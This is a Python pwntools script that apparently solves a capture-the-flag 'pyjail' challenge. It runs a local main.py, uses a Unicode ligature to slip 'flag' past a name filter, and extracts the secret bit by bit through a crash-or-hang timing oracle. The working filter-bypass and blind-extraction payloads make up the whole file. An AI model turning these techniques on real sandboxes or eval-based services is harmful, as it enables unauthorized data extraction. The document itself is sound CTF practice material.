from pwn import *
import signal
import time

context.log_level = 'critical'
#context.log_level = 'debug'

def die(*args):
    raise SystemError

signal.signal(signal.SIGALRM, die)

p = "\ufb02ag[%s]<'\\x%x'or 1j.a"
p2 = "2**complex.__\ufb02ags__**2"

flag = ""
cur = 0
while not len(flag) or flag[-1] != "}":
    bit = 2**6
    ch = 0
    while bit:
        io = process(['python3', 'main.py'])
        io.sendline((p%(cur, ch + bit)).encode())
        io.recvuntil(b"rer: ")
        io.sendline(p2.encode())
        time.sleep(2)
        eof = False
        try:
            io.recv(1,timeout=0)
        except EOFError:
            eof = True
        if not eof:
            ch += bit
            print(f'ord(flag[{cur}]) >= {ch}')
        else:
            print(f'ord(flag[{cur}]) < {ch+bit}')
        io.close()
        bit >>= 1
    flag += chr(ch)
    cur += 1
    print(flag)
